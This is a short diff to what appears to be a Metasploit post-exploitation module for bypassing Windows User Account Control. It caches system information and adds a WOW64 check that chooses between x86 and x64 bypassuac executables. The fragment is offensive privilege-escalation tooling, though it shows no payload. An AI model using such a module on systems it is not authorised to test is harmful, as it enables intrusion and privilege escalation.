@@ -43,7 +43,8 @@ class Metasploit3 < Msf::Post
 	def run
 
 		vuln = false
-		winver = session.sys.config.sysinfo["OS"]
+		sysinfo = session.sys.config.sysinfo
+		winver = sysinfo["OS"]
 		affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
 		affected.each { |v|
 			if winver.include? v
@@ -92,7 +93,7 @@ class Metasploit3 < Msf::Post
 
 		# decide, x86 or x64
 		bpexe = nil
-		if payload =~ /x64/
+		if payload =~ /x64/ or sysinfo["Architecture"] =~ /wow64/i
 			bpexe = ::File.join(path, "bypassuac-x64.exe")
 		else
 			bpexe = ::File.join(path, "bypassuac-x86.exe")
